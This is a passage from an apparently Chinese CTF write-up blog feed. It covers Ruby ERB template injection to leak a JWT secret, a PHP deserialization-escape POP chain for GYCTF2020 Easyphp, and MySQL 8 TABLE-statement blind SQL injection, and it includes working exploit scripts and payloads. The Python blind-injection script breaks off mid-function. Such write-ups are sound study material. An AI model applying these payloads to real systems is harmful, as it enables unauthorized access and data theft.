%&gt;%20is%20working</span><br></pre></td></tr></table></figure><p>进行测试，发现不可以执行，猜测是因为安全等级的原因，但是可以查看预定义变量，由于前面有进行匹配的操作，且进行匹配的代码是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;&quot;)</span><br></pre></td></tr></table></figure><p>所以我们可以使用$’预定义变量来进行模板注入，从而读取ENV[“SCERET”]的值，而首先进行的匹配是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;</span><br></pre></td></tr></table></figure><p>所以然后再用匹配后的值再进行匹配，所以SECRET参数的值最好为空，所以可以构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&lt;%=$&#x27;%&gt;&amp;do=&lt;%=$&#x27;%&gt;%20is%20working&amp;$SECRET=</span><br></pre></td></tr></table></figure><p>来读取ENV[“SECRET”]的值，然后用来伪造jwt，即可获得flag</p><p>参考文章：[<a href="https://www.anquanke.com/post/id/86867]">https://www.anquanke.com/post/id/86867]</a></p><pre><code>[https://www.wangan.com/docs/255][https://docs.ruby-lang.org/en/2.4.0/globals_rdoc.html][https://www.jianshu.com/p/4f316191f595]</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ruby-ERB模板注入以及jwt伪造&quot;&gt;&lt;a href=&quot;#ruby-ERB模板注入以及jwt伪造&quot; class=&quot;headerlink&quot; title=&quot;ruby ERB模板注入以及jwt伪造&quot;&gt;&lt;/a&gt;ruby ERB模板注入以及jwt伪造&lt;/h1&gt;&lt;p&gt;打开</summary>
      
    
    
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>pop链4之反序列化逃逸</title>
    <link href="http://example.com/2021/10/14/pop%E9%93%BE4%E4%B9%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8/"/>
    <id>http://example.com/2021/10/14/pop%E9%93%BE4%E4%B9%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8/</id>
    <published>2021-10-13T16:00:00.000Z</published>
    <updated>2021-10-14T15:25:17.784Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pop链4之反序列化逃逸-GYCTF2020-Easyphp"><a href="#pop链4之反序列化逃逸-GYCTF2020-Easyphp" class="headerlink" title="pop链4之反序列化逃逸([GYCTF2020]Easyphp)"></a>pop链4之反序列化逃逸([GYCTF2020]Easyphp)</h1><p>打开页面，发现是一个登录界面，所以我们尝试sql注入闭合测试，发现不行，然后dirsearch扫描目录，发现有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.zip</span><br></pre></td></tr></table></figure><p>泄露，所以审计源码</p><p>在lib.php中的User类中的__destruct()方法有一个危险函数file_get_contents()，但是由于safe函数过滤掉了flag，所以不可以使用，所以我们可以看向update.php文件，发现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if($_SESSION[&#x27;login&#x27;]===1)&#123;</span><br><span class="line">require_once(&quot;flag.php&quot;);</span><br><span class="line">echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是如何让$_SESSION[‘login’]=1，我们可以看向lib.php文件中的User类中的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if($this-&gt;id)&#123;</span><br><span class="line">$_SESSION[&#x27;id&#x27;]=$this-&gt;id;</span><br><span class="line">$_SESSION[&#x27;login&#x27;]=1;</span><br></pre></td></tr></table></figure><p>我们可以看见只要存在$this-&gt;id就是可以让$_SESSION[‘login’]为1，而$this-&gt;id实际为dbCtrl类的login()方法中的$idResult，而如果要让return $idResult，则要么</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if ($this-&gt;token==&#x27;admin&#x27;) &#123;</span><br><span class="line">    return $idResult;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要么绕过这个if</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (md5($this-&gt;password)!==$passwordResult)</span><br></pre></td></tr></table></figure><p>而$passwordResult是从数据库中读出来的，所以我们需要控制提交的sql语句，从而绕过if，得到$passwordResult，所以我们要想办法调用dbCtrl类的login()方法，且参数的值为自定义的sql语言，所以我们可以构造pop链</p><p>魔术方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__call：对象调用不可访问的函数时可以触发</span><br><span class="line"></span><br><span class="line">__toString()：当类的对象被当作字符串操作时会被调用</span><br></pre></td></tr></table></figure><p>所以我们可以构造一条pop链</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UpdateHelper::__destruct() --&gt; User::__toString() --&gt; info::__call()</span><br></pre></td></tr></table></figure><p>所以可以exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class User</span><br><span class="line">&#123;</span><br><span class="line">    public $id;</span><br><span class="line">    public $age=&#x27;select id,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&#x27;;</span><br><span class="line">    public $nickname;</span><br><span class="line"></span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;nickname-&gt;update($this-&gt;age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Info&#123;</span><br><span class="line">    public $age;</span><br><span class="line">    public $nickname;</span><br><span class="line">    public $CtrlCase;</span><br><span class="line">    public function __call($name,$argument)&#123;</span><br><span class="line">        $this-&gt;CtrlCase-&gt;login($argument[0]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">Class UpdateHelper&#123;</span><br><span class="line">    public $id;</span><br><span class="line">    public $newinfo;</span><br><span class="line">    public $sql;</span><br><span class="line"></span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class dbCtrl</span><br><span class="line">&#123;</span><br><span class="line">    public $hostname=&quot;127.0.0.1&quot;;</span><br><span class="line">    public $dbuser=&quot;root&quot;;</span><br><span class="line">    public $dbpass=&quot;root&quot;;</span><br><span class="line">    public $database=&quot;test&quot;;</span><br><span class="line">    public $name=&#x27;admin&#x27;;</span><br><span class="line">    public $password=&#x27;1&#x27;;//字符串1，不是数字1</span><br><span class="line">    public $mysqli;</span><br><span class="line">    public $token;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=new UpdateHelper();</span><br><span class="line">$a-&gt;sql=new User();</span><br><span class="line">$a-&gt;sql-&gt;nickname=new Info();</span><br><span class="line">$a-&gt;sql-&gt;nickname-&gt;CtrlCase=new dbCtrl();</span><br><span class="line"></span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>而由于这里是反序列化实例化对象，所以我们也需要将上面得到的结果放入Info类中，exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class User</span><br><span class="line">&#123;</span><br><span class="line">    public $id;</span><br><span class="line">    public $age=&#x27;select id,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&#x27;;</span><br><span class="line">    public $nickname;</span><br><span class="line"></span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;nickname-&gt;update($this-&gt;age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Info&#123;</span><br><span class="line">    public $age;</span><br><span class="line">    public $nickname;</span><br><span class="line">    public $CtrlCase;</span><br><span class="line">    public function __call($name,$argument)&#123;</span><br><span class="line">        $this-&gt;CtrlCase-&gt;login($argument[0]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">Class UpdateHelper&#123;</span><br><span class="line">    public $id;</span><br><span class="line">    public $newinfo;</span><br><span class="line">    public $sql;</span><br><span class="line"></span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class dbCtrl</span><br><span class="line">&#123;</span><br><span class="line">    public $hostname=&quot;127.0.0.1&quot;;</span><br><span class="line">    public $dbuser=&quot;root&quot;;</span><br><span class="line">    public $dbpass=&quot;root&quot;;</span><br><span class="line">    public $database=&quot;test&quot;;</span><br><span class="line">    public $name=&#x27;admin&#x27;;</span><br><span class="line">    public $password=&#x27;1&#x27;;//字符串1，不是数字1</span><br><span class="line">    public $mysqli;</span><br><span class="line">    public $token;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=new UpdateHelper();</span><br><span class="line">$a-&gt;sql=new User();</span><br><span class="line">$a-&gt;sql-&gt;nickname=new Info();</span><br><span class="line">$a-&gt;sql-&gt;nickname-&gt;CtrlCase=new dbCtrl();</span><br><span class="line"></span><br><span class="line">$b=new Info();</span><br><span class="line">$b-&gt;nickname=serialize($a);</span><br><span class="line">echo srialize($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;N;s:8:&quot;nickname&quot;;s:447:&quot;O:12:&quot;UpdateHelper&quot;:3:&#123;s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:&#123;s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:71:&quot;select id,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;N;s:8:&quot;nickname&quot;;N;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:8:&#123;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;N;&#125;&#125;&#125;&#125;&quot;;s:8:&quot;CtrlCase&quot;;N;&#125;</span><br></pre></td></tr></table></figure><p>由于它还要经过序列化，所以我们可以通过反序列化逃逸来绕过它这次的序列化，我们可以将这部分分离出来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:12:&quot;UpdateHelper&quot;:3:&#123;s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:&#123;s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:71:&quot;select id,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;N;s:8:&quot;nickname&quot;;N;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:8:&#123;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;N;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>然后在前面加上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;s:8:&quot;CtrlCase&quot;;</span><br></pre></td></tr></table></figure><p>因为要与原来的一样，然后由于有safe函数，所以可以利用union替换为hacker增加一个字符，所以我们可以构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:3:&#123;s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:&#123;s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:71:&quot;select id,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;N;s:8:&quot;nickname&quot;;N;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:8:&#123;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;N;&#125;&#125;&#125;&#125;;&#125;</span><br></pre></td></tr></table></figure><p>此时$_SESSION[‘token’]=”admin”，所以我们回到登录界面，任意登录即可获得flag</p><p>参考文章：[<a href="https://www.jianshu.com/p/21b5dd45724c]">https://www.jianshu.com/p/21b5dd45724c]</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;pop链4之反序列化逃逸-GYCTF2020-Easyphp&quot;&gt;&lt;a href=&quot;#pop链4之反序列化逃逸-GYCTF2020-Easyphp&quot; class=&quot;headerlink&quot; title=&quot;pop链4之反序列化逃逸([GYCTF2020]Easyphp)</summary>
      
    
    
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>table语句</title>
    <link href="http://example.com/2021/10/14/table%E8%AF%AD%E5%8F%A5/"/>
    <id>http://example.com/2021/10/14/table%E8%AF%AD%E5%8F%A5/</id>
    <published>2021-10-13T16:00:00.000Z</published>
    <updated>2021-10-14T15:14:21.250Z</updated>
    
    <content type="html"><![CDATA[<h1 id="table语句"><a href="#table语句" class="headerlink" title="table语句"></a>table语句</h1><p>mysql8版本上线了新的特性，就是table语句和VALUES语句</p><h2 id="table语句-1"><a href="#table语句-1" class="headerlink" title="table语句"></a>table语句</h2><p>作用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 具体用来在小表的扫描，如：路由表、配置类表、简单映射表等</span><br><span class="line"></span><br><span class="line">2. 用来替换是被当做子查询的这类小表的SELECT语句</span><br></pre></td></tr></table></figure><p>具体语法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table table_name [order by column_name] [LIMIT number [OFFSET number]]</span><br></pre></td></tr></table></figure><p>从语法中的order by column_name可以看出，可以排序，也可以过滤记录集</p><h3 id="简单全表扫描"><a href="#简单全表扫描" class="headerlink" title="简单全表扫描"></a>简单全表扫描</h3><p>传统语法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from t1;</span><br></pre></td></tr></table></figure><p>table语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table t1;</span><br></pre></td></tr></table></figure><h2 id="VALUES语句"><a href="#VALUES语句" class="headerlink" title="VALUES语句"></a>VALUES语句</h2><p>作用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用做功能展示或快速造数据场景，结果列名字以column_0开头，以此类推</span><br></pre></td></tr></table></figure><h3 id="单条values语句"><a href="#单条values语句" class="headerlink" title="单条values语句"></a>单条values语句</h3><p>语法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">values row(1,2,3);</span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">+----------+----------+----------+</span><br><span class="line">| column_0 | column_1 | column_2 |</span><br><span class="line">+----------+----------+----------+</span><br><span class="line">|        1|        2|        3|</span><br><span class="line">+----------+----------+----------+</span><br><span class="line">1 row inset(0.00 sec)</span><br></pre></td></tr></table></figure><h3 id="多条values语句"><a href="#多条values语句" class="headerlink" title="多条values语句"></a>多条values语句</h3><p>语法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">values row(1,2,3),row(10,9,8);</span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+----------+----------+----------+</span><br><span class="line">| column_0 | column_1 | column_2 |</span><br><span class="line">+----------+----------+----------+</span><br><span class="line">|        1 |        2 |        3 |</span><br><span class="line">|       10 |        9 |        8 |</span><br><span class="line">+----------+----------+----------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><h3 id="多条-VALUES-联合-UNION-ALL"><a href="#多条-VALUES-联合-UNION-ALL" class="headerlink" title="多条 VALUES 联合 UNION ALL"></a>多条 VALUES 联合 UNION ALL</h3><p>语法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">values row(1,2,3),row(10,9,8) union all values \</span><br><span class="line">    row(-1,-2,0),row(10,29,30),row(100,20,-9);</span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">+----------+----------+----------+</span><br><span class="line">| column_0 | column_1 | column_2 |</span><br><span class="line">+----------+----------+----------+</span><br><span class="line">|        1 |        2 |        3 |</span><br><span class="line">|       10 |        9 |        8 |</span><br><span class="line">|       -1 |       -2 |        0 |</span><br><span class="line">|       10 |       29 |       30 |</span><br><span class="line">|      100 |       20 |       -9 |</span><br><span class="line">+----------+----------+----------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><h3 id="根据字段下标排序，从1开始的多条values联合union-all-values"><a href="#根据字段下标排序，从1开始的多条values联合union-all-values" class="headerlink" title="根据字段下标排序，从1开始的多条values联合union all values"></a>根据字段下标排序，从1开始的多条values联合union all values</h3><p>语法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">values row(1,2,3),row(10,9,8) union all values \</span><br><span class="line">    row(-1,-2,0),row(10,29,30),row(100,20,-9) order by 1 desc ;</span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">+----------+----------+----------+</span><br><span class="line">| column_0 | column_1 | column_2 |</span><br><span class="line">+----------+----------+----------+</span><br><span class="line">|      100 |       20 |       -9 |</span><br><span class="line">|       10 |        9 |        8 |</span><br><span class="line">|       10 |       29 |       30 |</span><br><span class="line">|        1 |        2 |        3 |</span><br><span class="line">|       -1 |       -2 |        0 |</span><br><span class="line">+----------+----------+----------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><h2 id="实例-鹤城杯ezsql2"><a href="#实例-鹤城杯ezsql2" class="headerlink" title="实例(鹤城杯ezsql2)"></a>实例(鹤城杯ezsql2)</h2><p>那时我的想法是使用异或注入，但是发现重要的select被过滤掉了，然后发现mysql版本是8以上，所以可以使用table语句来绕过select过滤</p><p>爆数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admn&#x27;||(ascii(substr(database(),1,1))=32)#</span><br></pre></td></tr></table></figure><p>爆出数据库为ctf</p><p>爆数据表，我们知道数据表的信息一般存储在information_schema.tables中，所以我们可以使用table语句来读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;/**/and/**/ROW(&#x27;ctf&#x27;,&#123;&#125;,1,2,3,4)&gt;(TABLE/**/information_schema.tables/**/order/**/by/**/database_name/**/limit/**/1,1)#</span><br></pre></td></tr></table></figure><p>由于infoemation_schema.tables被过滤掉了，所以可以使用mysql.innodb_table_stats来读取数据表的信息，其中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROW(&#x27;ctf&#x27;,&#123;&#125;,1,2,3,4)</span><br></pre></td></tr></table></figure><p>意思是每条列的第一行进行比较，从而爆出ctf库中的数据表有哪些，爆出数据表为f11114g</p><p>爆数据表中的信息，可以利用mysql8新增的特性table语句来构造盲注</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin\&#x27;and/**/substr((table/**/f11114g/**/limit/**/1,1),&#123;&#125;,1)=\&#x27;&#123;&#125;\&#x27;#</span><br></pre></td></tr></table></figure><p>所以我们可以写exp</p><p>爆数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">import string</span><br><span class="line">import time</span><br><span class="line">import sys</span><br><span class="line">pt = &#x27;&#123;&#125;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-+[]?&lt;&gt;@!#$%^&amp;*~&#x27;</span><br><span class="line">url=&quot;&quot;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">sql=&quot;user()&quot;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def blindequ(start,end):</span><br><span class="line">    ret=&quot;&quot;</span><br><span class="line">    for i in range(start,end):</span><br><span class="line">        for ch in pt:</span><br><span class="line">            payload=&quot;admn&#x27;||(substr(&#123;0&#125;,&#123;1&#125;,1)=&#x27;&#123;2&#125;&#x27;)#&quot;.format(sql,i,ch)</span><br><span class="line">            data = &#123;</span><br><span class="line">                &quot;username&quot;:payload,</span><br><span class="line">                &quot;password&quot;:&#x27;a&#x27;</span><br><span class="line">            &#125;</span><br><span class="line">            #print data</span><br><span class="line">            #req=requests.post(url,data=data,allow_redirects=False)</span><br><span class="line">            req=requests.post(url+&quot;/login.php&quot;,data=data)</span><br><span class="line">            #print req.text</span><br><span class="line">            #if req.status_code!=200 and req.status_code!=302:</span><br><span class="line">            #    continue </span><br><span class="line">            if  &quot;password error!&quot; in req.text:</span><br><span class="line">                ret=ret+ch</span><br><span class="line">                